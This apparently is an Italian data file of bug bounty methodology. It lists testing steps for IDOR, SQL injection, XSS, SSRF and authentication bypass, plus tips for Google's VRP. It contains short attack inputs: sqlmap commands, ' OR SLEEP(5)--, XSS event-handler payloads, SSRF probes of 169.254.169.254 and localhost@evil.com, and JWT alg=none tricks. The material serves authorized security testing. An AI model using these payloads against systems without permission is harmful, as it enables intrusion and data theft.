testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

Step 4: Studia il flusso OAuth: la maggior parte dei bug Google sono qui
Step 5: Testa cross-product: un bug in Drive impatta anche Photos/Gmail
Step 6: Usa Google stesso per enumerarsi: dorks come site:*.google.com inurl:admin
Step 7: Leggi il blog di Project Zero per capire la qualità attesa
Step 8: Sii paziente: Google VRP è molto competitivo
tips: 💡 Google VRP è IL programma più competitivo: 100+ hunter esperti al giorno
💡 Concentrati su prodotti meno battuti: Google Fit, Google Chat, Cloud Console
💡 I bug accettati sono spesso catene: 2-3 low = 1 high
💡 Studia i writeup su Project Zero: mostrano lo standard qualitativo
💡 Il reverse engineering di app mobile Google è spesso fruttuoso
💡 Google Docs/Sheets collaborative editing ha avuto decine di RCE storici
💡 Account multipli sono essenziali: crea 5-10 account Google per test
💡 Non riportare bug in vendor di terze parti (es. problema in libreria JS)
💡 Il triage è lento, non scoraggiarti se non rispondono in 2 settimane
